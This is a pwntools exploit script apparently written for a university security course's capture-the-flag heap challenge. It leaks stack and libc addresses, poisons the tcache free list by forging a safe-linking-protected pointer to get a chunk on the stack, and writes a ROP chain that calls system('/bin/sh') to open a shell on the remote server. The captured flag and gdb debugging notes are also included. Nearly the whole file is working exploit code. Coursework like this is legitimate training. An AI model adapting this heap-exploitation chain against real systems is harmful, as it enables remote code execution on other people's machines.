from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *(main)
b *delete+88
commands
    heap
end
b *add+17
b *add+22
commands
    heap
end
b *main+392
b *free+106
#set pagination off
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33755)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/ghostbusters") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def add_equipment():
    p.sendline(b"a")
    p.recvuntil(b"New equipment ID: ")
    equipment_addr  = int(p.recvline())
    print(f"Malloced Addr: {hex(equipment_addr)}")
    name = flat({8*0: 0, 8*1: 0x71, 8*2: b"A"*8})
    p.sendline(name)
    return equipment_addr


def call_free(addr):
    p.sendline(b"d")
    p.sendline(f"{addr}".encode())


def update(addr, payload):
    p.sendline(b"u")
    p.sendline(f"{addr}".encode())
    name = payload
    p.sendline(name)

def view_equipment(addr):
    p.sendline(b"v")
    p.recvuntil(f"{addr} | Name: ".encode())
    name = p.recvline()[:-1] # protected pointer leak
    return name

def  PROTECT_PTR(pos, ptr):
    return (((pos) >> 12) ^ (ptr))

ret_offset  = 0x7ffcea7a9648 - 140724242388512
libc_offset = 0x7f9b7dd6e000 - 140305808138848
p.recvuntil(b"Operator ID: ")
ret_addr  = int(p.recvline()) + ret_offset
p.recvuntil(b"Paranormal Level: ")
libc_addr = int(p.recvline()) + libc_offset

print(f"Ret Addr:  {hex(ret_addr)}")
print(f"Libc Addr: {hex(libc_addr)}")

equipment_addr = add_equipment()
equipment_addr2 = add_equipment() #free list must contain 2 items if we want to be able to use fake chunk and the forged address for the next chunk on the stack
call_free(equipment_addr2)

call_free(equipment_addr + 0x10)

#update(equipment_addr, b"A"*24) # so we can see the protected pointer left by our free call
#print(view_equipment(equipment_addr))


update(equipment_addr, flat({8*0: 0, 8*1: 0x71, 8*2: PROTECT_PTR(equipment_addr + 0x10, ret_addr-8)})) # overwrite next_pointer in free chunk

#call_free(equipment_addr + 0x10)

add_equipment()
hopefully_stack_addr = add_equipment()
print(f"Hopefully Stack Addr: {hex(hopefully_stack_addr)}")


libc = ELF("libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))


update(ret_addr-8, b"A"*8 + rop.chain()) # overwrite next_pointer in free chunk


p.interactive()


#softsec{icyfqGIkeSJ08dok4Rvj2pcpTnNf4l8dfF4qn3aR19q4L8veWFaVeiPpjU9ULJmV}





#frame 6
# move into older frame to see error that happened

#list
# output source around context

#p *tcache within state where tcache was used:
#$3 = {
#  counts = {0, 0, 0, 0, 0, 1, 0 <repeats 58 times>},
#  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x7fff6e707e68, 0x0 <repeats 58 times>}
#}
